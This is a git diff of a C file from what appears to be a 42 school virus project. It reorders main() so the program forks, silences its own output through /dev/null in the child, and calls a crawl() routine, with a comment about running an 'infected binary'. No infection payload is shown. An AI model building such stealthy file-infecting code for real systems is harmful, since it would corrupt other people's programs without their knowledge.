@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/02/20 12:30:09 by mbatty            #+#    #+#             */
-/*   Updated: 2026/04/13 18:19:44 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/04/14 10:52:08 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -20,7 +20,7 @@ int	mute_outputs()
 	int	fd = open("/dev/null", O_RDONLY);
 	if (fd == -1)
 		return (-1);
-	
+
 	if (dup2(fd, STDOUT_FILENO) == -1
 		|| dup2(fd, STDERR_FILENO) == -1)
 	{
@@ -51,16 +51,18 @@ int	crawl()
 
 int	main(void)
 {
+	int	pid = fork();
+	if (pid == -1)
+		return (0);
+	else if (pid != 0)
+	{
+		// execute infected binary if there is one
+		return (0);
+	}
+
 	if (mute_outputs() == -1)
 		return (0);
-
-	int	pid = fork();
-	if (pid == -1 || pid != 0)
-		return (0);
-
 	if (crawl() == -1)
 		return (0);
-
-	// execute infected binary if there is one
 	return (0);
 }
